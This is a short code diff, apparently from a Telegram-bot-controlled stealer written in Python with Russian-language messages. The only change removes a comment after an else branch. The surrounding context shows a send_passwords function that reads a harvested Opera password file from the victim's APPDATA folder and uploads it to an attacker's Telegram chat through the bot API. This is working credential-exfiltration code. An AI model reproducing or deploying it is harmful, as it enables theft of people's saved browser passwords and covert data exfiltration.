@@ -107,7 +107,7 @@ def send_passwords(message) :
             files = {'document': open(os.getenv("APPDATA") + '\\passwords_opera.txt','rb')}
             requests.post("https://api.telegram.org/bot" + bot_token + "/sendDocument?chat_id=" + chat_id , files=files)
 
-    else : # Иначе
+    else : 
         bot.send_message(chat_id, "Ошибка! Команда введена неправильно!")
 
 @bot.message_handler(commands=['info', 'Info']) 
